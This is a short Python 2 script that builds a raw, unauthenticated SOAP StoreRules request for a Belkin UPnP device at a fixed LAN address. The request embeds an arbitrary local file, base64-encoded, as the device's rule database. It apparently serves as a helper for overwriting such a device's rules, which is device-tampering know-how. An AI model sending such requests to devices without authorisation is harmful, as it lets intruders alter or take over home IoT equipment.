#!/usr/bin/python
import sys
import base64

if len(sys.argv) < 3:
	print "Error: please supply file and version"
	exit();

header = 'POST /upnp/control/rules1 HTTP/1.1\r\nContent-Type: text/xml; charset="utf-8"\r\nSOAPACTION: "urn:Belkin:service:rules:1#StoreRules"\r\nContent-Length: %d\r\nHOST: 192.168.1.143:49153\r\nUser-Agent: CyberGarage-HTTP/1.0\r\n\r\n'

body = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body>
  <u:StoreRules xmlns:u="urn:Belkin:service:rules:1">
   <ruleDbVersion>%d</ruleDbVersion>
   <processDb>1</processDb>
   <ruleDbBody>&lt;![CDATA["""
with open(sys.argv[1]) as fd:
	file_data = fd.read()
	body += base64.b64encode(file_data)

body += """]]&gt;</ruleDbBody>
  </u:StoreRules>
 </s:Body>
</s:Envelope>"""

body = body%(int(sys.argv[2]))
sys.stdout.write(header%(len(body))+body)
